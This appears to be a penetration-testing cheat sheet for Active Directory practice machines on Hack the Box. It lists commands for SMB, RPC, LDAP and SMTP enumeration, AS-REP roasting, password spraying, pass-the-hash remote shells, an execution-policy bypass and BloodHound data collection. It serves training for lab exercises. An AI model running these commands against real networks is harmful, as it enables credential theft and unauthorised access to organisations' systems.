
Active Directory Machines for Practice

Hack the Box (HTB)
The following Active Directory machines can be found on the HTB platform. I recommand that you attempt them when you are stuck, 
watch ippsec's videos on them

    monteverde
    cascade
    traversex
    fuse
    intelligence
    remote
    resolute
    sizzle
    multimaster
    sauna
    forest
    object
    active
    

Enumeration


SMB

- crackmapexec smb <IP> --shares
- crackmapexec smb <IP> -u '' -p '' --shares
- crackmapexec smb <IP> -u '' --shares
- crackmapexec smb <IP> --pass-pol
- crackmapexec smb --users
- smbmap -H <IP>
- smbclient -L //<IP>
- smbclient --no-pass //<IP>/<share name> -U''


Crackmapexec

- crackmapexec smb <IP>
- crackmapexec smb <IP> --shares
- crackmapexec smb <IP> --pass-pol
- crackmapexec smb <IP> --users
- crackmapexec smb <IP> -u ' ' -p ' ' --shares
- crackmapexec smb <IP> -u ' ' --shares

RPC
	
- RPC Null Authentication: rpcclient -U '' <IP>
- RPC Null Authentication with no password: rpcclient -U '' <IP>
- If you are able to log in, run enumdomusers to list out users
- If you get a list of users, you can check their descriptions with the following command: querydispinfo


LDAP

git clone windapsearch by ropnop if you don’t already have it
- python [windapsearch.py](http://windapsearch.py) -U --full --dc-ip <IP>
- nmap -n -sV --script "ldap* and not brute" -p 389 <IP>
- ./windapsearch.py -d hb.local --dc-ip <IP> -u ""
- ./windapsearch.py -d hb.local --dc-ip <IP> -- "objectclass=*"
- ldapsearch -h <IP> -x
- ldapsearch -h <IP> -x -s base namingcontexts


SMTP
- nmap -v --script="smtp*" -p25,110,143,465,587,993,995 <IP>
- nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <IP>
- sudo perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>


Do you have valid username only?
	
If you have only users names, you can try an ASREProasting attack to see if a user has pre authentication disabled.
	- GetNPUsers.py -usersfile <username file> -outputfile asreproast -dc-ip <IP> dictionary.csl/ 
	- GetNPUsers.py domain/guest -dc-ip <IP> -format john 

You can also use the usernames as the password, sometimes users can use their username as password
	- crackmapexec smb <IP> -u uname.txt -p uname.txt
	- crackmapexec smb <IP> -u uname.txt -p 'Password2'  --password spray
Alternatively, password spraying can be an option.


Do you have only password?
	Enumerate more to identify usernames
	-  ./kerbrute_linux_amd64 userenum --dc <IP> -d roast xato-net-10-million-usernames.txt --- for possible usernames


Gaining Shell
	
./evil-winrm.rb -i [DN/IP] -u [username] -p '[password]'
./evil-winrm.rb -i [DN/IP] -u [username] -H [HASH]
psexec.py -hashes [hash] [DN]/[username]@[IP]
smbexec.py -hashes [hash] [DN]/[username]@[IP]
wmiexec.py -hashes [hash] [DN]/[username]@[IP]
psexec.py [DN]/[username]:[password]@[IP]
smbexec.py [DN]/[username]:[password]@[IP]
wmiexec.py [DN]/[username]:[password]@[IP]
xfreerdp /u:[username] /p:[password] /v:[IP] 
xfreerdp /u:[username] /pth:[NT hash] /v:[IP]
pth-winexe -U [DN]/[username]%[hash] //[IP] cmd



Mount SMB Share
sudo mount -t cifs -o 'username=<username>,password=<password>' //<IP>/<Share you want to mount> /mnt/<folder to mount to>


AD Enumeration (Post Compromise)
Powerview
Quick Commands:
- Get-NetDomain
- Get-NetDomainController
- Get-DomainPolicy
- (Get-DomainPolicy)."system access"
- Get-NetUser | select <command> eg select cn, description
- Get-userProperty -Properties pwdlastset


Bloodhound
- Connect to the database by running: sudo neo4j console
- run bloodhound in new tab
- Transfer the SharpHound.ps1 script to the victim machine and invoke powershell using powershell -ep bypass
- Import the module: . .\SharpHound.ps1
- Collect the data: Invoke-BloodHound -CollectionMethod All -Domain SCRIPTKIDDIEHUB -ZipFileName tadi.zip
or use SharpHound.exe -c All

Transfer the zip file to your attacker machine and upload it to bloodhound where it will put it all in graphs
![image](https://user-images.githubusercontent.com/77746798/193925403-e4efc028-b139-456b-a291-60f3846f71ab.png)

  
  
